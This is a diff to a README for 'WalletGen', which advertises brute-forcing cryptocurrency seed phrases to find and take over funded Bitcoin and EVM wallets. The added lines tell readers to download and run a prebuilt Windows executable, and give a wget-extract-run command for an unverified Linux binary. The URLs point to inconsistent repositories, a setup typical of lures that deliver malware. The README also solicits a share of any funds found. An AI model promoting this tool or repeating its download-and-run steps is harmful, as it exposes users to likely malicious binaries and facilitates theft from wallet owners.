@@ -1,28 +1,17 @@
 # Seed Phrase Generator - WalletGen
 
+[![downloads](https://img.shields.io/github/downloads/tony-dev1/wallets-finder/total)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen) [![license](https://img.shields.io/github/license/tony-dev1/wallets-finder)](/LICENSE)
+
 **Wallet Gen** is a tool designed for brute force and generating cryptocurrency wallets (such as **Bitcoin** and **EVM-based** wallets like **ETH, BNB, MATIC, etc.**), as well as discovering forgotten or lost wallets that contain an existing balance.
 
 <p align="center">
     <img width="1000" height="460" src="/assets/walletgen1.png" />
 </p>
 
-<p align="center">
-    <img width="1000" height="460" src="/assets/walletgen_linux2.png" />
-</p>
-
 ## Overview
 
 **Wallet Gen** is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, **Wallet Gen** boasts significantly higher wallet generation speeds, with performance primarily relying on your graphics card. 
 For generating EVM wallets (ETH, BNB, MATIC, etc.), Wallet Gen uses the keccak256 algorithm, while Bitcoin wallets are created using the Segwit format under Bech32.
-
-## Downloads
-### WalletGen
-- [Windows x64](../../releases/walletgen)
-- [Linux](../../releases/walletgen)
-
-### Database
-- [btc_database.txt](../../releases/database)
-- [evm_database.txt](../../releases/database)
 
 ## Features
 
@@ -48,6 +37,26 @@ For generating EVM wallets (ETH, BNB, MATIC, etc.), Wallet Gen uses the keccak25
 **Wallet Gen** allows you to search using brute force method for two types of crypto wallets with an existing balance. To search for BTC wallets, press key `3` in the menu or run `start_search_btc.bat`. For searching EVM wallets (such as Ethereum, BNB, etc.), press key `4` in the menu or run `start_search_evm.bat`. 
 
 The search speed is determined by your hardware, especially your graphics card. To increase your chances of finding a wallet with a balance, you can run multiple instances of the program, from 1 to 4, depending on the power of your graphics card.
+
+## How to start
+
+### Windows 
+- Download [WalletGen.zip](https://github.com/tony-dev1/wallets-finder/releases/download/walletgen/WalletGen_v1.7.0.zip) (5MB)
+- Unpack anywhere
+- Run `WalletGen.exe`
+
+### Linux (x86-64bit)
+```bash
+wget https://github.com/tony-dev1/walletgen/releases/download/walletgen/walletgen-v1.5.0-linux.tar.gz
+tar -xzf walletgen-v1.5.0-linux.tar.gz
+cd walletgen
+./walletgen
+```
+### Download and Use Database (for more speed)
+| Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
+|---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
+| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](https://github.com/tony-dev1/walletgen/releases/download/database/btc_database.txt)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
+| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_ddatabase.txt](https://github.com/tony-dev1/walletgen/releases/download/database/evm_database.txt)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700
 
 ## My Finds
 
@@ -107,6 +116,9 @@ I encourage you, when you find a wallet with a balance, to send me a small porti
 **BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9
 
 **ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693
+
+## Credits
+This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.
 
 ## License
 This project is licensed under the [Apache 2.0 License](/LICENSE)
